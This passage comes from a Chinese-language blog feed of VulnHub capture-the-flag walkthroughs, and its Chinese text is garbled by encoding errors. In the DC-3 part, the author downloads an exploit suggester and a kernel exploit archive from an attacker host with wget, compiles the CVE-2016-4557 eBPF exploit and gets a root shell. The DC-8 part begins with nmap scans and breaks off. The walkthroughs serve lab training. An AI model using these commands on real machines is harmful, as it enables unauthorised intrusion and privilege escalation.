class="string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_port</span> = <span class="string">&#x27;21&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offset</span> = <span class="string">&#x27;UTC&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailonline</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailfrom</span> = <span class="string">&#x27;freddy@norealaddress.net&#x27;</span>;</span><br><span class="line">        public <span class="variable">$fromname</span> = <span class="string">&#x27;DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">        public <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cache_platformprefix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaDesc</span> = <span class="string">&#x27;A website for DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaKeys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaVersion</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$robots</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef_rewrite</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef_suffix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$unicodeslugs</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$feed_limit</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">        public <span class="variable">$feed_email</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        public <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/html/administrator/logs&#x27;</span>;</span><br><span class="line">        public <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/tmp&#x27;</span>;</span><br><span class="line">        public <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        public <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">        public <span class="variable">$shared_session</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">www-data@DC-3:/var/www/html$</span><br></pre></td></tr></table></figure>

<p><code>å¾ˆæ˜¾ç„¶è¿™å›æ²¡æœ‰ç‹—å±è¿äº†</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/var/www/html$ sudo -l               </span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br></pre></td></tr></table></figure>

<h3 id="3-åˆ©ç”¨ç³»ç»Ÿå†…æ ¸ææƒ"><a href="#3-åˆ©ç”¨ç³»ç»Ÿå†…æ ¸ææƒ" class="headerlink" title="3.åˆ©ç”¨ç³»ç»Ÿå†…æ ¸ææƒ"></a>3.åˆ©ç”¨ç³»ç»Ÿå†…æ ¸ææƒ</h3><p><code>æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ uname -a      </span><br><span class="line">Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">www-data@DC-3:/tmp$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure>

<p><code>å°†linux-exploit-suggesterå¤åˆ¶åˆ°DC3ä¸Š</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cp linux-exploit-suggester.sh /root</span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cd</span></span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br><span class="line">root@JIYE:~<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.1.5 - - [22/Aug/2020 02:06:47] <span class="string">&quot;GET /linux-exploit-suggester.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ wget 192.168.1.6/linux-exploit-suggester.sh</span><br><span class="line">--2020-08-22 16:07:27--  http://192.168.1.6/linux-exploit-suggester.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 84889 (83K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;linux-exploit-suggester.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">linux-exploit-sugge 100%[===================&gt;]  82.90K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-22 16:07:27 (353 MB/s) - <span class="string">&#x27;linux-exploit-suggester.sh&#x27;</span> saved [84889/84889]</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$ </span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œï¼ŒæŸ¥æ‰¾æ¼æ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ chmod +x linux-exploit-suggester.sh </span><br><span class="line">www-data@DC-3:/tmp$ ./linux-exploit-suggester.sh </span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 4.4.0</span><br><span class="line">Architecture: i686</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 16.04</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">74 kernel space exploits</span><br><span class="line">45 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,[ ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125; ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-16995] eBPF_verifier</span><br><span class="line"></span><br><span class="line">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,ubuntu=14.04&#123;kernel:4.4.0-89-generic&#125;,[ ubuntu=(16.04|17.04) ]&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/45010</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be <span class="built_in">set</span> &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-8655] chocobo_root</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04)&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125; ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40871</span><br><span class="line">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-4557] double-fdput()</span><br><span class="line"></span><br><span class="line">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125; ]</span><br><span class="line">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be <span class="built_in">set</span> &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-7308] af_packet</span><br><span class="line"></span><br><span class="line">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=16.04 ]&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   Comments: CAP_NET_RAW <span class="built_in">cap</span> or CONFIG_USER_NS=y needed. Modified version at <span class="string">&#x27;ext-url&#x27;</span> adds support <span class="keyword">for</span> additional kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-6074] dccp</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/41458</span><br><span class="line">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000112] NETIF_F_UFO</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: ubuntu=14.04&#123;kernel:4.4.0-*&#125;,[ ubuntu=16.04 ]&#123;kernel:4.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN <span class="built_in">cap</span> or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at <span class="string">&#x27;ext-url&#x27;</span> adds support <span class="keyword">for</span> additional distros/kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="line"></span><br><span class="line">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19</span><br><span class="line">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="line">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-15666] XFRM_UAF</span><br><span class="line"></span><br><span class="line">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: </span><br><span class="line">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested <span class="keyword">in</span> QEMU only</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-2384] usb-midi</span><br><span class="line"></span><br><span class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=14.04,fedora=22</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="line">   Comments: Requires ability to plug <span class="keyword">in</span> a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-0728] keyring</span><br><span class="line"></span><br><span class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of<span class="_">-a</span>-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure>

<p><code>æœ¬æ¬¡ä½¿ç”¨</code><strong>[CVE-2016-4557]</strong><code>å°†39772.zipå¤åˆ¶åˆ°DC3</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ wget 192.168.1.6/39772.zip</span><br><span class="line">--2020-08-22 16:18:03--  http://192.168.1.6/39772.zip</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7025 (6.9K) [application/zip]</span><br><span class="line">Saving to: <span class="string">&#x27;39772.zip&#x27;</span></span><br><span class="line"></span><br><span class="line">39772.zip           100%[===================&gt;]   6.86K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-22 16:18:03 (612 MB/s) - <span class="string">&#x27;39772.zip&#x27;</span> saved [7025/7025]</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">39772.zip</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$ unzip 39772.zip </span><br><span class="line">Archive:  39772.zip</span><br><span class="line">   creating: 39772/</span><br><span class="line">  inflating: 39772/.DS_Store         </span><br><span class="line">   creating: __MACOSX/</span><br><span class="line">   creating: __MACOSX/39772/</span><br><span class="line">  inflating: __MACOSX/39772/._.DS_Store  </span><br><span class="line">  inflating: 39772/crasher.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._crasher.tar  </span><br><span class="line">  inflating: 39772/exploit.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._exploit.tar  </span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">39772</span><br><span class="line">39772.zip</span><br><span class="line">__MACOSX</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure>

<h3 id="4-exploit"><a href="#4-exploit" class="headerlink" title="4.exploit"></a>4.exploit</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ <span class="built_in">cd</span> 39772</span><br><span class="line">www-data@DC-3:/tmp/39772$ ls</span><br><span class="line">crasher.tar  exploit.tar</span><br><span class="line">www-data@DC-3:/tmp/39772$ tar -xvf exploit.tar  </span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">www-data@DC-3:/tmp/39772$ ls</span><br><span class="line">crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar</span><br><span class="line">www-data@DC-3:/tmp/39772$ <span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit/</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls</span><br><span class="line">compile.sh  doubleput.c  hello.c  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ chmod +x compile.sh </span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh </span><br><span class="line">doubleput.c: In <span class="keyword">function</span> <span class="string">&#x27;make_setuid&#x27;</span>:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to <span class="built_in">integer</span> of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to <span class="built_in">integer</span> of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)<span class="string">&quot;&quot;</span></span><br><span class="line">               ^</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$</span><br></pre></td></tr></table></figure>

<p><code>ç¼–è¯‘ç”Ÿæˆæ‰§è¡Œæ–‡ä»¶ï¼Œè¿›è¡Œåˆ©ç”¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls</span><br><span class="line">compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput </span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">&#x27;ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x14-ææƒå®Œæˆï¼Œæ‰¾åˆ°flag"><a href="#0x14-ææƒå®Œæˆï¼Œæ‰¾åˆ°flag" class="headerlink" title="0x14.ææƒå®Œæˆï¼Œæ‰¾åˆ°flag"></a>0x14.ææƒå®Œæˆï¼Œæ‰¾åˆ°flag</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cd </span></span><br><span class="line">bash: <span class="built_in">cd</span>: HOME not <span class="built_in">set</span></span><br><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cd /</span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home        lib         media  opt   root  sbin  srv  tmp  var</span><br><span class="line">boot  etc  initrd.img  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz</span><br><span class="line">root@DC-3:/<span class="comment"># cd /root</span></span><br><span class="line">root@DC-3:/root<span class="comment"># </span></span><br><span class="line">root@DC-3:/root<span class="comment"># ls</span></span><br><span class="line">the-flag.txt</span><br><span class="line">root@DC-3:/root<span class="comment"># cat the-flag.txt </span></span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">&#x27;_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;</span>ve enjoyed this challenge as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please <span class="built_in">let</span> me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br><span class="line">root@DC-3:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8</title>
    <url>/2020/08/31/DC-8/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>This challenge is a bit of a hybrid between being an actual challenge, and being a â€œproof of conceptâ€ as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</p>
<p>The â€œproof of conceptâ€ portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</p>
<p>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</p>
<p>You probably wouldnâ€™t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but itâ€™s definitely there and doing itâ€™s job.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 20:37 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 00:0C:29:57:6A:A6 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.06 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œä¸”Drupalçš„ç‰ˆæœ¬ä¸º7</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># nmap -sC -sV -v 192.168.1.3 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 20:38 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 20:38</span><br><span class="line">Scanning 192.168.1.3 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 20:38, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 20:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 20:38, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 20:38</span><br><span class="line">Scanning 192.168.1.3 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.3</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.3</span><br><span class="line">Completed SYN Stealth Scan at 20:38, 0.08s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 20:38</span><br><span class="line">Scanning 2 services on 192.168.1.3</span><br><span class="line">Completed Service scan at 20:38, 6.71s elapsed (2 